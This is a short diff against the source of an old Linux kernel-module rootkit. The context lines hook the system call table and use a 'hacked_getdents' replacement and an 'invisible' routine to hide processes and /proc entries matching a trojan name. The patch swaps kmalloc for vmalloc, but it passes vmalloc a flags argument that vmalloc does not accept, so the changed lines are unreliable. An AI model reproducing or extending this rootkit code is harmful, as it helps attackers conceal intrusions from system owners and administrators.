@@ -12,7 +12,7 @@
 #include <linux/mman.h>
 #include <linux/string.h>
 #include <linux/fs.h>
-#include <linux/malloc.h>
+#include <linux/vmalloc.h>
 #include <linux/proc_fs.h>
 
 extern void* sys_call_table[];
@@ -89,7 +89,7 @@ int invisible(pid_t pid)
  struct task_struct *task = get_task(pid);
  char *buffer;
  if (task) {
-  buffer = kmalloc(200, GFP_KERNEL);
+  buffer = vmalloc(200, GFP_KERNEL);
   memset(buffer, 0, 200);
   task_name(task, buffer);
   if (strstr(buffer, (char *) &mtroj)) {
@@ -119,7 +119,7 @@ int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
  if (dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev) == 1)
   proc=1;
  if (tmp > 0) {
-  dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
+  dirp2 = (struct dirent *) vmalloc(tmp, GFP_KERNEL);
   memcpy_fromfs(dirp2, dirp, tmp);
   dirp3 = dirp2;
   t = tmp;
